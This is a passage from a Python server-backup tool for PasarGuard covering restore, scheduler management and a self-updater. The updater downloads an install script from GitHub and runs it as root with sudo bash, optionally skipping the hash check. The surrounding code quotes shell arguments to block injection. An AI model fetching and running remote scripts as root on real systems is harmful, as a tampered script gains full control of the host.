                raise Exception("Pasarguard did not start")
            if include_node and not start_compose_local(PG_NODE_DIR, "PG-Node"):
                print_error("PG-Node did not start.")
            print_header("Local Restore Completed Successfully!")
            print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") + " running.")
            return

        local_db_svc = backend["container"]
        if not local_db_svc:
            raise Exception(f"Could not determine the {backend['type']} container for restore.")
        print_info(f"Detected database service: {local_db_svc}")

        if not start_compose_local(PASARGUARD_DIR, "Pasarguard DB",
                                    services=[local_db_svc], wait_postgres=True):
            raise Exception(f"{local_db_svc} did not start")

        if not _restore_databases_local("db_dump", local_db_svc, backend_type=backend["type"]):
            raise Exception("Database restore failed.")

        if not start_compose_local(PASARGUARD_DIR, "Pasarguard"):
            raise Exception("Pasarguard did not start")
        if include_node and not start_compose_local(PG_NODE_DIR, "PG-Node"):
            print_error("PG-Node did not start.")

        print_header("Local Restore Completed Successfully!")
        print_success("PasarGuard" + (" and PG-Node are" if include_node else " is") + " running.")

    except Exception as e:
        print_error(f"Restore error: {e}")
        print_warning("System may be in a partially restored state.")

# ── Workflow 5: Manage running/installed schedulers ───────────
def _systemctl_action(unit_name, action, quiet=False):
    # v4.2.1 — unit_name flows into a shell=True command. Strict validation
    # plus shlex.quote so neither typos nor upstream output quirks can
    # inject extra arguments to systemctl.
    _validate_instance_name(unit_name)
    return run_command(f"systemctl {action} {shlex.quote(unit_name)}.service", quiet=quiet)

def _format_remaining(target_str):
    try:
        target = datetime.datetime.strptime(target_str, "%Y-%m-%d %H:%M:%S")
    except Exception:
        return target_str
    remaining = (target - datetime.datetime.now()).total_seconds()
    if remaining <= 0:
        return "now"
    total_min = int(remaining // 60)
    h, m = divmod(total_min, 60)
    if h > 0 and m > 0:
        return f"{h}h {m}m"
    if h > 0:
        return f"{h}h"
    if m > 0:
        return f"{m}m"
    return "<1m"

def workflow_manage_schedulers():
    print_header("Manage Backup Schedulers")

    items = []
    for suffix, name, active in list_systemd_backup_units():
        items.append(("systemd", name, active))
    for name in list_screen_sessions():
        items.append(("screen", name, True))
    for name in list_tmux_sessions():
        items.append(("tmux", name, True))

    if not items:
        print_warning("No scheduler instances found (systemd service / screen / tmux session).")
        print_info("Create one from 'Auto Backup to Telegram Bot (Scheduled)' first.")
        return

    print(f"  {C.R2}Scheduler instances found:{C.RESET}\n")
    for i, (kind, name, active) in enumerate(items, 1):
        status = f"{C.R1}RUNNING{C.RESET}" if active else f"{C.R3}STOPPED{C.RESET}"
        phase_note = ""
        st = read_state(name)
        if st:
            phase, extra, age = st
            if phase == "backing_up" and age < 3600:
                phase_note = f"  {C.R1}(backing up now){C.RESET}"
            elif phase == "sleeping" and extra:
                phase_note = f"  {C.R3}(sleeping — {_format_remaining(extra)} until next backup){C.RESET}"
            elif phase == "stopped":
                phase_note = f"  {C.R3}(stopped by Ctrl+C){C.RESET}"
        print(f"  {C.R1}{i}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}[{kind:<7}] {name}{C.RESET}   {status}{phase_note}")
    print()

    choice = input(f"  {C.R2}> Select a number to manage (ENTER to cancel): {C.RESET}").strip()
    if not choice:
        return
    try:
        idx = int(choice) - 1
        if idx < 0:
            raise ValueError
        kind, name, active = items[idx]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return

    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Restart (pick up latest script update){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Stop{C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Remove completely{C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Update Bot Token / Admin Chat ID{C.RESET}")
    print(f"  {C.R1}5{C.RESET}  {C.R3}-{C.RESET}  {C.WH}Cancel{C.RESET}")
    print()
    act = input(f"  {C.R2}> Choose action for '{name}' (1-5): {C.RESET}").strip()

    if act == "1":
        _restart_scheduler_instance(kind, name)

    elif act == "2":
        if kind == "systemd":
            if _systemctl_action(name, "stop"):
                print_success(f"'{name}' stopped (still installed — start it again anytime).")
            else:
                print_error(f"Failed to stop '{name}'.")
        elif kind == "screen":
            # v4.2.1 — name comes from `screen -list` regex, but defend
            # against any name that smuggles shell metachars in.
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"screen -S {shlex.quote(name)} -X quit"):
                print_success(f"Screen session '{name}' stopped.")
            else:
                print_error("Failed to stop the screen session.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            if run_command(f"tmux kill-session -t {shlex.quote(name)}"):
                print_success(f"Tmux session '{name}' stopped.")
            else:
                print_error("Failed to stop the tmux session.")

    elif act == "3":
        confirm = input(
            f"  {C.R1}> This will permanently remove '{name}'. Confirm? (y/n): {C.RESET}"
        ).strip().lower()
        if confirm != "y":
            print_warning("Aborted.")
            return
        if kind == "systemd":
            _systemctl_action(name, "stop", quiet=True)
            _systemctl_action(name, "disable", quiet=True)
            unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
            try:
                if os.path.exists(unit_path):
                    os.remove(unit_path)
                run_command("systemctl daemon-reload", quiet=True)
                # Clean up the credentials file too, since it holds the bot token.
                creds_path = _creds_path(name)
                if os.path.exists(creds_path):
                    os.remove(creds_path)
                print_success(f"Removed systemd scheduler '{name}'.")
            except Exception as e:
                print_error(f"Failed to remove unit file: {e}")
        elif kind == "screen":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"screen -S {shlex.quote(name)} -X quit", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed screen scheduler '{name}'.")
        elif kind == "tmux":
            try:
                _validate_instance_name(name)
            except ValueError as e:
                print_error(f"Refusing to act on unsafe session name: {e}")
                return
            run_command(f"tmux kill-session -t {shlex.quote(name)}", quiet=True)
            creds_path = _creds_path(name)
            if os.path.exists(creds_path):
                try: os.remove(creds_path)
                except Exception: pass
            print_success(f"Removed tmux scheduler '{name}'.")

    elif act == "4":
        _update_scheduler_credentials(kind, name)

    else:
        print_warning("Cancelled.")

def _restart_scheduler_instance(kind, name):
    """Restart a scheduler instance so it picks up the latest code from
    'Update to Latest Version', without deleting and recreating it.

    - systemd: ExecStart already points at the on-disk script path, so a
      plain `systemctl restart` re-execs the process against whatever code
      is currently on disk — that alone is enough to pick up an update.
    - screen/tmux: the running process is a live Python interpreter that
      already loaded the old code into memory, so a restart has to kill the
      session and spawn a fresh one. We rebuild the exact daemon command
      from the stored credentials/meta file (token/chat/proxy/interval/
      scope) so the user doesn't have to re-enter anything."""
    if kind == "systemd":
        if _systemctl_action(name, "restart"):
            print_success(f"'{name}' restarted and is now running the latest script version.")
        else:
            print_error(f"Failed to restart '{name}'.")
        return

    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials/config found for '{name}' — cannot rebuild it.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    daemon_cmd = build_daemon_command(meta["interval"], meta["node"], instance=name)
    # v4.2.1 — validate + quote before any shell=True use.
    try:
        _validate_instance_name(name)
    except ValueError as e:
        print_error(f"Refusing to act on unsafe session name: {e}")
        return
    q = shlex.quote(name)

    if kind == "screen":
        run_command(f"screen -S {q} -X quit", quiet=True)
        if run_command(f"screen -dmS {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh screen session — now running the latest script version.")
        else:
            print_error(f"Failed to restart screen session '{name}'.")
    elif kind == "tmux":
        run_command(f"tmux kill-session -t {q}", quiet=True)
        if run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
            print_success(f"'{name}' restarted in a fresh tmux session — now running the latest script version.")
        else:
            print_error(f"Failed to restart tmux session '{name}'.")

def _update_scheduler_credentials(kind, name):
    """Let the user change a running scheduler's bot token and/or admin
    chat ID without deleting and recreating the whole instance. Updates the
    0600 credentials file, then restarts the instance so the change takes
    effect immediately (same restart logic as option 1)."""
    meta = read_daemon_meta(name)
    if not meta and kind == "systemd":
        # Older scheduler (pre-v4.2) — try to auto-migrate its credentials
        # out of the plaintext unit file before giving up.
        meta = _migrate_legacy_systemd_instance(name)
    if not meta:
        print_error(f"No stored credentials found for '{name}' — cannot update it.")
        print_info("This can happen for a scheduler created by an older script version")
        print_info("whose unit file could not be auto-migrated.")
        print_info("Remove it and create a fresh scheduler instance instead.")
        return

    print()
    print_info(f"Current admin chat ID: {meta['chat']}")
    print_info(f"Current bot token: {_mask_secret(meta['token'])}")
    print()

    new_token = input(f"  {C.R2}> New Bot Token (ENTER to keep current): {C.RESET}").strip()
    new_chat  = input(f"  {C.R2}> New Admin Chat ID (ENTER to keep current): {C.RESET}").strip()

    if new_chat and not new_chat.lstrip("-").isdigit():
        print_error("Admin Chat ID must be numeric. Aborted — nothing changed.")
        return

    if not new_token and not new_chat:
        print_warning("Nothing entered — no changes made.")
        return

    write_daemon_creds(
        name,
        bot_token=new_token or None,
        admin_id=new_chat or None,
        proxy=meta["proxy"],
        interval_h=meta["interval"],
        include_node=meta["node"],
    )
    print_success(f"Credentials updated for '{name}'.")

    print_info("Restarting so the new credentials take effect...")
    _restart_scheduler_instance(kind, name)

# ── Workflow 6: Update to latest version ──────────────────────
# v4.2.1 — replaced `curl | sudo bash` with a download-then-verify-then-run
# flow: save install.sh to a 0700 temp file (no execution yet), download the
# publisher's install.sh.sha256 if available, abort on SHA256 mismatch, and
# only then exec the saved file with sudo bash. This blunts the most
# catastrophic class of bug in the previous pattern: a compromised
# raw.githubusercontent.com payload no longer gets piped straight into a
# root shell the instant the user types "y".
UPDATE_URL_BASE   = "https://raw.githubusercontent.com/CIAUB/PG-Backup/main"
UPDATE_SCRIPT_URL = f"{UPDATE_URL_BASE}/install.sh"
UPDATE_HASH_URL   = f"{UPDATE_URL_BASE}/install.sh.sha256"

def _download_to(url, dest, timeout=30):
    """Download `url` to `dest` (a filesystem path). Returns True on
    success, False on any failure (with a human-readable error already
    printed)."""
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
    except Exception as e:
        print_error(f"Could not download {url}: {e}")
        return False
    try:
        fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as f:
            f.write(data)
    except Exception as e:
        print_error(f"Could not save {dest}: {e}")
        return False
    return True

def _sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(64 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()

def workflow_update():
    print_header("Update PG-Backup to Latest Version")
    print_warning("This downloads the official installer/updater from GitHub (CIAUB/PG-Backup),")
    print_warning("verifies its SHA256 against the publisher's hash file (if available),")
    print_warning("and only then runs it as root.")

    confirm = input(f"  {C.R2}> Proceed with update? (y/n): {C.RESET}").strip().lower()
    if confirm != "y":
        print_warning("Aborted.")
        return

    # Private 0700 temp dir — the script + hash files never live in
    # world-readable /tmp while we're working with them.
    tmp_dir = tempfile.mkdtemp(prefix="pgbackup_update_")
    try:
        script_path = os.path.join(tmp_dir, "install.sh")
        hash_path   = os.path.join(tmp_dir, "install.sh.sha256")

        print_info(f"Downloading {UPDATE_SCRIPT_URL} …")
        if not _download_to(UPDATE_SCRIPT_URL, script_path):
            return

        print_info(f"Downloading {UPDATE_HASH_URL} …")
        hash_ok = _download_to(UPDATE_HASH_URL, hash_path)

        if hash_ok:
            try:
                with open(hash_path) as f:
                    expected = f.read().strip().split()[0].lower()
                actual = _sha256_of(script_path)
                if expected != actual:
                    print_error("SHA256 mismatch — refusing to run the installer.")
                    print_error(f"  expected: {expected}")
                    print_error(f"  actual:   {actual}")
                    return
                print_success(f"SHA256 verified: {actual}")
            except Exception as e:
                print_warning(f"Could not parse hash file ({e}) — proceeding anyway.")
        else:
            # v4.2.1 — refuse to silently downgrade. An attacker who can
            # MITM the hash file (or block its download) but not the
            # script itself would otherwise get a free sudo bash. Require
            # the user to opt in explicitly.
            print_warning("Could not download install.sh.sha256 — no integrity check available.")
            print_warning("(Network problem, or the publisher hasn't published a hash file on this branch.)")
            yn = input(
                f"  {C.R1}> Run the unverified installer as root anyway? (y/n): {C.RESET}"
            ).strip().lower()
            if yn != "y":
                print_error("Aborted for safety. The hash file is the only defense against a")
                print_error("tampered installer — without it, running the script is unsafe.")
                return
            print_warning("Proceeding WITHOUT integrity verification at the user's explicit request.")

        print()
        print(hline())
        # Run the saved file (not a network pipe) as root.
        result = subprocess.run(["sudo", "bash", script_path])
    except Exception as e:
        print_error(f"Failed to run updater: {e}")
        return
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)
    print(hline())
    print()

    if result.returncode == 0:
        print_success("Update finished.")
        print_info("Existing running scheduler instances (screen/tmux/systemd) keep running")
        print_info("with the old code in memory — restart them from 'Manage Backup Schedulers'")
        print_info("if you want them to pick up the new version.")
        print_info("Re-run this script to use the updated version.")
    else:
        print_error(f"Updater exited with code {result.returncode}. Check the output above.")

# ── Headless daemon entrypoint (used by screen / tmux / systemd) ──
def run_daemon_from_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--daemon-backup", action="store_true")
    # v4.2: --token/--chat/--proxy are no longer accepted here (they used to
    # leak via `ps`/systemd unit files). Credentials are now read from a
    # 0600 file keyed by --instance. Old flags are still parsed (accepted
    # but ignored with a warning) so a stale unit file from v4.1 doesn't
    # hard-crash — but it also won't leak a working token either.
    parser.add_argument("--token", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--chat", default=None, help=argparse.SUPPRESS)
    # v4.2.1 — --proxy removed entirely. Proxy credentials (often including
    # user:pass@host:port) were leaking via `ps` and /proc/<pid>/cmdline.
    # They live in the 0600 credentials file now, same as token/chat.
    # --proxy is still parsed (silently dropped) so a stale v4.1 daemon
    # command line doesn't hard-crash the unit.
    parser.add_argument("--proxy", default=None, help=argparse.SUPPRESS)
    parser.add_argument("--interval", type=float, required=True)
    parser.add_argument("--node", action="store_true")
    parser.add_argument("--instance", default="default")
    args = parser.parse_args()

    # v4.2.1 — --instance flows into _creds_path(). Reject anything that
    # could escape /etc/pasarguard-backup before opening the file.
    try:
        _validate_instance_name(args.instance, allow_empty=False)
    except ValueError as e:
        sys.stderr.write(f"[pg-backup] invalid --instance value: {e}\n")
        sys.exit(1)

    if args.token or args.chat:
        sys.stderr.write(
            "[pg-backup] --token/--chat CLI args are no longer supported for security "
            "reasons; re-create this scheduler from the menu so credentials are stored "
            "in a 0600 file instead.\n"
        )
        sys.exit(1)

    try:
        token, chat, proxy = read_daemon_creds(args.instance)
    except FileNotFoundError:
        sys.stderr.write(f"[pg-backup] No credentials file found for instance '{args.instance}' "
                          f"in {CREDS_DIR}. Re-create the scheduler from the menu.\n")
        sys.exit(1)

    proxy = args.proxy or proxy  # args.proxy is always None (SUPPRESS) — kept for back-compat
    run_scheduled_backup_loop(token, chat, args.interval, args.node, proxy, args.instance)

# ── Main menu ─────────────────────────────────────────────────
MENU = [
    ("1", "Auto Backup & Transfer to New Server"),
    ("2", "Auto Backup to Telegram Bot (Scheduled)"),
    ("3", "Manual Backup (Save locally)"),
    ("4", "Manual Restore (From local zip)"),
    ("5", "Manage Backup Schedulers (start/stop/restart)"),
    ("6", "Update to Latest Version"),
    ("7", "Exit"),
]

def main():
    while True:
        print_header()

        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        for num, label in MENU:
            if num == "7":
                print(f"  {C.R3}{num}{C.RESET}  {C.R3}-{C.RESET}  {C.R2}{label}{C.RESET}")
            else:
                print(f"  {C.R1}{num}{C.RESET}  {C.R3}-{C.RESET}  {C.WH}{label}{C.RESET}")
        print(f"  {C.R3}{'─' * 50}{C.RESET}")
        print()

        choice = input(f"  {C.R2}> Select option (1-7): {C.RESET}").strip()
        print()

        if choice == "1":
            workflow_transfer()
            pause_and_return()
        elif choice == "2":
            workflow_backup_bot()
            pause_and_return()
        elif choice == "3":
            workflow_manual_backup()
            pause_and_return()
        elif choice == "4":
            workflow_manual_restore()
            pause_and_return()
        elif choice == "5":
            workflow_manage_schedulers()
            pause_and_return()
        elif choice == "6":
            workflow_update()
            pause_and_return()
        elif choice == "7":
            print(f"  {C.R2}Goodbye.{C.RESET}\n")
            sys.exit(0)
        else:
            print_error("Invalid option. Please enter 1-7.")
            time.sleep(1.5)

if __name__ == "__main__":
    if "--daemon-backup" in sys.argv:
        run_daemon_from_args()
    else:
        main()
